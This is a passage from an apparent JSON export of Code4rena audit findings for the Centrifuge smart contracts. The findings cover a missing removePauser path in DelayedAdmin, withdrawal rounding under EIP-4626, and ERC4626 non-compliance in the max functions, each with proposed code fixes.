unpause() public auth {         root.unpause();     }      function scheduleRely(address target) public auth {         root.scheduleRely(target);     }      function cancelRely(address target) public auth {         root.cancelRely(target);     } } ```  No implemented functionalities exist to trigger `PauseAdmin.removePauser`. Additionally, the contract features an unused `event File`, a and fails to record the `PauseAdmin`'s address upon initiation or elsewhere.  As anticipated, `Auth` (inherited) also does not handle this responsibility:  To confirm that I did not misunderstand anything, I thoroughly searched the entire contest repository for occurrences of `removePauser`. However, I could only find them in `PauseAdmin.sol`, where the function to remove a pauser is implemented, and in a test case that directly calls the `PauseAdmin`.  ## Tools Used  Manual: code editor.  ## Recommended Mitigation Steps  ### 1. Implement the `PauseAdmin.removePauser` Functionality in `DelayedAdmin.sol` with This Diff:  ```diff 5a6 > import {PauseAdmin} from \"./PauseAdmin.sol\"; 13a15 >     PauseAdmin public immutable pauseAdmin; 18c20 <     constructor(address root_) { --- >     constructor(address root_, address pauseAdmin_) { 19a22 >         pauseAdmin = PauseAdmin(pauseAdmin_); 41,42c44,48 <     // @audit HM? How can delayed admin call `PauseAdmin.removePauser if not coded here? <     // @audit According to documentation: \"The delayed admin is a ward on the pause admin and can trigger PauseAdmin.removePauser.\" --- >  >     // --- Emergency actions -- >     function removePauser(address pauser) public auth { >         pauseAdmin.removePauser(pauser); >     }  ```  ### 2. Add This Test Function to `AdminTest` Contract in `test/Admin.t.sol`   ```c++     function testEmergencyRemovePauser() public {         address evilPauser = address(0x1337);         pauseAdmin.addPauser(evilPauser);         assertEq(pauseAdmin.pausers(evilPauser), 1);          delayedAdmin.removePauser(evilPauser);         assertEq(pauseAdmin.pausers(evilPauser), 0);     } ```  ### 3. Change the `DelayedAdmin` Creation in `script/Deployer.sol` with This diff:  ```diff 55c55 <         delayedAdmin = new DelayedAdmin(address(root)); --- >         delayedAdmin = new DelayedAdmin(address(root), address(pauseAdmin));  ```  ### 4. Test  `$ forge test`             ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/46", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-36"], "target": "2023-09-centrifuge-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-09-centrifuge-findings/blob/main/data/rokinot-Q.md)."}, {"title": "```trancheTokenAmount``` should be rounded UP when proceeding to a withdrawal or previewing a withdrawal.", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/34", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L515 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L396 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L591   # Vulnerability details  ## Impact  This is good practice when implementing the EIP-4626 vault standard as it is more secure to favour the vault than its users in that case. This can also lead to issues down the line for other protocol integrating Centrifuge, that may assume that rounding was handled according to EIP-4626 best practices.  ## Proof of Concept When calling the [```processWithdraw```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L515) function, the ```trancheTokenAmount``` is computed through the [```_calculateTrancheTokenAmount```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L591) function, which rounds DOWN the number of shares required to be burnt to receive the ```currencyAmount``` payout/withdrawal  ```solidity /// @dev Processes user's tranche token redemption after the epoch has been executed on Centrifuge. /// In case user's redempion order was fullfilled on Centrifuge during epoch execution MaxRedeem and MaxWithdraw /// are increased and LiquidityPool currency can be transferred to user's wallet on calling processRedeem or processWithdraw. /// Note: The trancheTokenAmount required to fullfill the redemption order was already locked in escrow upon calling requestRedeem and burned upon collectRedeem. /// @notice trancheTokenAmount return value is type of uint256 to be compliant with EIP4626 LiquidityPool interface /// @return trancheTokenAmount the amount of trancheTokens redeemed/burned required to receive the currencyAmount payout/withdrawel. function processWithdraw(uint256 currencyAmount, address receiver, address user) public auth returns (uint256 trancheTokenAmount) { address liquidityPool = msg.sender; uint128 _currencyAmount = _toUint128(currencyAmount); require( (_currencyAmount <= orderbook[user][liquidityPool].maxWithdraw && _currencyAmount != 0), \"InvestmentManager/amount-exceeds-withdraw-limits\" );  uint256 redeemPrice = calculateRedeemPrice(user, liquidityPool); require(redeemPrice != 0, \"LiquidityPool/redeem-token-price-0\");  uint128 _trancheTokenAmount = _calculateTrancheTokenAmount(_currencyAmount, liquidityPool, redeemPrice); _redeem(_trancheTokenAmount, _currencyAmount, liquidityPool, receiver, user); trancheTokenAmount = uint256(_trancheTokenAmount); } ```  ```solidity function _calculateTrancheTokenAmount(uint128 currencyAmount, address liquidityPool, uint256 price) internal view returns (uint128 trancheTokenAmount) { (uint8 currencyDecimals, uint8 trancheTokenDecimals) = _getPoolDecimals(liquidityPool);  uint256 currencyAmountInPriceDecimals = _toPriceDecimals(currencyAmount, currencyDecimals, liquidityPool).mulDiv( 10 ** PRICE_DECIMALS, price, MathLib.Rounding.Down );  trancheTokenAmount = _fromPriceDecimals(currencyAmountInPriceDecimals, trancheTokenDecimals, liquidityPool); } ```  As an additional reason the round UP the amount, the computed amount of shares is also used to [```_decreaseRedemptionLimits```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L635C14-L635C39), which could potentially lead to a rounded UP remaining redemption limit post withdrawal (note that for the same reason it would we wise to round UP the ```_currency``` amount as well when calling ```_decreaseRedemptionLimits```).  The same function is used in the [```previewWithdraw```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L396) function, where is should be rounded UP for the same reasons.  ```solidity /// @return trancheTokenAmount is type of uin256 to support the EIP4626 Liquidity Pool interface function previewWithdraw(address user, address liquidityPool, uint256 _currencyAmount) public view returns (uint256 trancheTokenAmount) { uint128 currencyAmount = _toUint128(_currencyAmount); uint256 redeemPrice = calculateRedeemPrice(user, liquidityPool); if (redeemPrice == 0) return 0;  trancheTokenAmount = uint256(_calculateTrancheTokenAmount(currencyAmount, liquidityPool, redeemPrice)); } ```   ## Tools Used  Visual Studio / Manual Review  ## Recommended Mitigation Steps  As the we do not always want to round the amount of shares UP in [```_calculateTrancheTokenAmount```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L591) (e.g. when used in [```previewDeposit```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L370) or [```processDeposit```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L427) the shares amount is correctly rounded DOWN), the function would actually require an extra argument like below:  ```solidity function _calculateTrancheTokenAmount(uint128 currencyAmount, address liquidityPool, uint256 price, Math.Rounding rounding) internal view returns (uint128 trancheTokenAmount) { (uint8 currencyDecimals, uint8 trancheTokenDecimals) = _getPoolDecimals(liquidityPool);  uint256 currencyAmountInPriceDecimals = _toPriceDecimals(currencyAmount, currencyDecimals, liquidityPool).mulDiv( 10 ** PRICE_DECIMALS, price, MathLib.Rounding.Down );  trancheTokenAmount = _fromPriceDecimals(currencyAmountInPriceDecimals, trancheTokenDecimals, liquidityPool); } ``` And be used as   ```solidity _calculateTrancheTokenAmount(currencyAmount, liquidityPool, redeemPrice, Math.Rounding.Ceil) ``` In [```previewWithdraw```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L396) and [```processWithdraw```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L515)  And   ```solidity _calculateTrancheTokenAmount(_currencyAmount, liquidityPool, depositPrice, Math.Rounding.Floor) ``` In [```previewDeposit```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L370) and [```processDeposit```](https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L427)   ## Assessed type  Math"}, {"title": "LiquidityPool is not fully compliant with ERC4626", "html_url": "https://github.com/code-423n4/2023-09-centrifuge-findings/issues/25", "labels": ["bug", "downgraded by judge", "grade-b", "low quality report", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "Q-39"], "target": "2023-09-centrifuge-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L129-L132 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L154-L157 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L164-L167 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/LiquidityPool.sol#L186-L189 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L349-L367 https://github.com/code-423n4/2023-09-centrifuge/blob/main/src/InvestmentManager.sol#L323-L347   # Vulnerability details  ## Impact The implementations of `maxDeposit`, `maxMint`, `maxWithdraw`, `maxRedeem` do not take into account additional limits and revert conditions that are present in the corresponding action functions. Therefore the `max`- functions may overestimate the amount in some cases. This breaks the on-chain composability of ERC4626 vaults.  ### `maxDeposit` According to the [ERC-4626 specification](https://eips.ethereum.org/EIPS/eip-4626), > *`maxDeposit` MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert.*  `maxDeposit` always returns `orderbook[user][liquidityPool].maxDeposit`. ```solidity // File: LiquidityPool.sol function maxDeposit(address receiver) public view returns (uint256) {     return investmentManager.maxDeposit(receiver, address(this)); } ```  ```solidity // File: InvestmentManager.sol function maxDeposit(address user, address liquidityPool) public view returns (uint256 currencyAmount) {     currencyAmount = uint256(orderbook[user][liquidityPool].maxDeposit); } ```  However, the implementation of the deposit flow in `InvestmentManager.processDeposit` has additional revert conditions: ```solidity // File: InvestmentManager.sol     function processDeposit(address user, uint256 currencyAmount) public auth returns (uint256 trancheTokenAmount) {         address liquidityPool = msg.sender;         uint128 _currencyAmount = _toUint128(currencyAmount);         require(             (_currencyAmount <= orderbook[user][liquidityPool].maxDeposit && _currencyAmount != 0),             \"InvestmentManager/amount-exceeds-deposit-limits\"         );          uint256 depositPrice = calculateDepositPrice(user, liquidityPool);         require(depositPrice != 0, \"LiquidityPool/deposit-token-price-0\");          uint128 _trancheTokenAmount = _calculateTrancheTokenAmount(_currencyAmount, liquidityPool, depositPrice);         _deposit(_trancheTokenAmount, _currencyAmount, liquidityPool, user);         trancheTokenAmount = uint256(_trancheTokenAmount);     }      function _deposit(uint128 trancheTokenAmount, uint128 currencyAmount, address liquidityPool, address user)         internal     {         LiquidityPoolLike lPool = LiquidityPoolLike(liquidityPool);          _decreaseDepositLimits(user, liquidityPool, currencyAmount, trancheTokenAmount); // decrease the possible deposit limits         require(lPool.checkTransferRestriction(msg.sender, user, 0), \"InvestmentManager/trancheTokens-not-a-member\");         require(             lPool.transferFrom(address(escrow), user, trancheTokenAmount),             \"InvestmentManager/trancheTokens-transfer-failed\"         );          emit DepositProcessed(liquidityPool, user, currencyAmount);     } ```  `maxDeposit` must return 0 in the cases where executing the deposit would revert with `\"LiquidityPool/deposit-token-price-0\"` or  `\"InvestmentManager/trancheTokens-not-a-member\"`.  ### `maxMint`, `maxWithdraw`, `maxRedeem` The analysis of `maxDeposit` applies analogously to `maxMint`, `maxWithdraw` and `maxRedeem`:  * `InvestmentManager.processMint` has the following revert conditions not handled by `maxMint`: `\"LiquidityPool/deposit-token-price-0\"`, `\"InvestmentManager/trancheTokens-not-a-member\"`. * `InvestmentManager.processWithdraw` has the following revert conditions not handled by `maxWithdraw`: `\"LiquidityPool/redeem-token-price-0\"`. * `InvestmentManager.processRedeem` has the following revert conditions not handled by `maxRedeem`: `\"LiquidityPool/redeem-token-price-0\"`.  ### Additional sources of non-compliance  > *`withdraw` MUST support a withdraw flow where the shares are burned from owner directly where msg.sender has EIP-20 approval over the shares of owner.* > *`redeem` MUST support a redeem flow where the shares are burned from owner directly where msg.sender has EIP-20 approval over the shares of owner.*  Due to the fact that the system handles withdraw/redeem action by syndicating them and executing them by a trusted party, these approval flows are not implemented.  > *`convertToShares` MUST NOT show any variations depending on the caller.* > *`convertToShares` MUST NOT revert unless due to integer overflow caused by an unreasonably large input.* > *`convertToAssets` MUST NOT show any variations depending on the caller.* > *`convertToAssets` MUST NOT revert unless due to integer overflow caused by an unreasonably large input.*  The corresponding functions in `InvestmentManager` have the `auth` modifier, meaning that they will revert if `LiquidityPool` is not a ward of `InvestmentManager`. This should not be the case if the system is configured correctly, however there is still a theoretical case of non-compliance.  ```solidity     function convertToShares(uint256 _assets, address liquidityPool) public view auth returns (uint256 shares)     function convertToAssets(uint256 _shares, address liquidityPool) public view auth returns (uint256 assets) ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps The requirements by ERC4626 are there to make vaults composable by default. > *The Vault interface is designed to be optimized for integrators with a feature complete yet minimal interface. Details such as accounting and allocation of deposited tokens are intentionally not specified, as Vaults are expected to be treated as black boxes on-chain and inspected off-chain before use.*  * Return `0` in the `max`-function if the additional revert conditions in the `process-`functions. * Remove the `auth` modifier from `convertToShares` and `convertToAssets`.   ## Assessed type  ERC4626"}]